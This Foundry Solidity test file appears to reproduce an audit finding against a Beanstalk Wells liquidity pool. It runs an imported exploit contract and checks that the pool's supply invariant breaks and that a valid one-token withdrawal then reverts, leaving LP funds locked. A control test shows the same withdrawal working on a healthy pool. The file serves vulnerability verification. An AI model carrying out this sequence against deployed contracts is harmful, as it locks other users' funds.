// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "./18431-protocols-invariants-can-be-broken-cyfrin-beanstalk-wells-ma.sol";

contract InvariantBreakTest is Test {
    function test_invariantBreak_bricks_valid_removeLiquidityOneToken() public {
        Exploit exploit = new Exploit();

        // run replays the finding's sequence and internally asserts the harm.
        exploit.run();

        // Re-assert the harm from the test's perspective.
        // 1. Invariant broken: totalSupply drifted strictly above calcLpTokenSupply(reserves).
        uint256 ts = exploit.totalSupplyAfter();
        uint256 calc = exploit.calcSupplyAfter();
        assertGt(ts, calc, "totalSupply should exceed calcLpTokenSupply(reserves)");

        // 2. A valid removeLiquidityOneToken reverts (arithmetic underflow) -> funds locked.
        assertTrue(exploit.finalWithdrawReverted(), "valid one-token withdrawal must revert");

        // 3. The locked LP is still held.
        assertGe(exploit.well().balanceOf(address(exploit)), exploit.lockedLp(), "locked LP retained");

        emit log_named_uint("totalSupply()          ", ts);
        emit log_named_uint("calcLpTokenSupply(res) ", calc);
        emit log_named_uint("invariant gap (ts-calc)", ts - calc);
        emit log_named_uint("locked LP (cannot exit)", exploit.lockedLp());
    }

    /// @dev Control: on a fresh, in-sync Well, removeLiquidityOneToken works fine.
    function test_control_freshWell_removeOne_ok() public {
        MockToken t0 = new MockToken();
        MockToken t1 = new MockToken();
        ConstantProduct2 cp2 = new ConstantProduct2();
        Well well = new Well(IERC20(address(t0)), IERC20(address(t1)), IWellFunction(address(cp2)));

        t0.mint(address(this), 1_000e18);
        t1.mint(address(this), 1_000e18);
        t0.approve(address(well), type(uint256).max);
        t1.approve(address(well), type(uint256).max);
        uint[] memory amts = new uint[](2);
        amts[0] = 1_000e18;
        amts[1] = 1_000e18;
        well.addLiquidity(amts, 0, address(this), type(uint256).max);

        // A small one-token withdrawal succeeds when the invariant holds.
        uint256 out = well.removeLiquidityOneToken(1e18, IERC20(address(t0)), 0, address(this), type(uint256).max);
        assertGt(out, 0, "fresh well one-token withdrawal should return tokens");
    }
}
